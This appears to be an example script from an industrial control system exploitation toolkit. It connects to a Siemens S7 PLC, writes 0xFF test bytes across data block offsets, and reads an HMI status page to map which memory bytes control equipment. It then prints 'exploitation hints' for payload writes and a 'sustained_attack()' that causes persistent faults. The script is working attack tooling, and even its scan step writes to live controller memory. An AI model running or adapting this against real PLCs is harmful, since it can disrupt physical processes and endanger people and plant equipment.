#!/usr/bin/env python3
"""
S7comm Memory Scanning Example

Demonstrates how to map PLC memory to observable effects
using an HTTP status endpoint (HMI).

This is useful for:
- Discovering which memory offsets control which equipment
- Finding the exact bytes to modify for exploitation
- Understanding the PLC program structure

Usage:
    python s7_memory_scan.py --ip 192.168.1.1 --port 102 --status-url http://192.168.1.1:8080/status
"""

import sys
import os
import json
import argparse

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ics_exploitation_mcp import ICSExploitationMCP


def main():
    parser = argparse.ArgumentParser(description="S7comm Memory Scanner")
    parser.add_argument("--ip", required=True, help="PLC IP address")
    parser.add_argument("--port", type=int, default=102, help="S7comm port")
    parser.add_argument("--status-url", required=True, help="HTTP status endpoint URL")
    parser.add_argument("--db", type=int, default=1, help="Data Block number to scan")
    parser.add_argument("--start", type=int, default=0, help="Start offset")
    parser.add_argument("--end", type=int, default=64, help="End offset")
    args = parser.parse_args()
    
    print("=" * 60)
    print("S7comm Memory Scanner")
    print("=" * 60)
    print(f"Target PLC: {args.ip}:{args.port}")
    print(f"Status URL: {args.status_url}")
    print(f"Scan range: DB{args.db} offset {args.start}-{args.end}")
    print("=" * 60)
    
    mcp = ICSExploitationMCP()
    toolkit = mcp.s7
    
    # Check installation
    check = toolkit.check_installation()
    if not check.get('installed'):
        print("\n[!] python-snap7 not installed")
        print("    Run: pip install python-snap7")
        return
    
    # Connect
    print("\n[*] Connecting to PLC...")
    result = toolkit.connect(args.ip, rack=0, slot=0, port=args.port)
    if not result.get('success'):
        print(f"[-] Connection failed: {result.get('error')}")
        return
    print(f"[+] Connected to {result.get('cpu_type', 'PLC')}")
    
    # Scan
    print(f"\n[*] Scanning DB{args.db} offsets {args.start}-{args.end}...")
    print("    This will write test values and observe status changes.")
    print("    Each offset takes ~0.5 seconds.\n")
    
    result = toolkit.scan_db_effects(
        db_number=args.db,
        status_url=args.status_url,
        start_offset=args.start,
        end_offset=args.end,
        test_value="FF"
    )
    
    if not result.get('success'):
        print(f"[-] Scan failed: {result.get('error')}")
        toolkit.disconnect()
        return
    
    # Results
    print("\n" + "=" * 60)
    print("SCAN RESULTS")
    print("=" * 60)
    
    print(f"\nOffsets tested: {result.get('offsets_tested', 0)}")
    
    offset_map = result.get('offset_map', {})
    if offset_map:
        print("\nMemory Map (offset -> affected fields):")
        for offset, fields in sorted(offset_map.items(), key=lambda x: int(x[0])):
            print(f"  Offset {offset:3}: {', '.join(fields)}")
    else:
        print("\nNo observable effects found in this range.")
        print("Try a different offset range or verify the status URL.")
    
    # Detailed effects
    effects = result.get('effects_found', {})
    if effects:
        print("\nDetailed Effects:")
        for offset, changes in sorted(effects.items(), key=lambda x: int(x[0])):
            print(f"\n  Offset {offset}:")
            for field, values in changes.items():
                print(f"    {field}: {values.get('baseline')} -> {values.get('after_write')}")
    
    # Exploitation hints
    if offset_map:
        print("\n" + "=" * 60)
        print("EXPLOITATION HINTS")
        print("=" * 60)
        print("\nTo exploit these offsets:")
        print("  1. Generate a payload: s7_generate_payload('all_max', 128)")
        print("  2. Write to target offsets: s7_db_write(db, offset, payload)")
        print("  3. For persistent faults, use sustained_attack()")
    
    # Disconnect
    toolkit.disconnect()
    print("\n[+] Done")


if __name__ == "__main__":
    main()
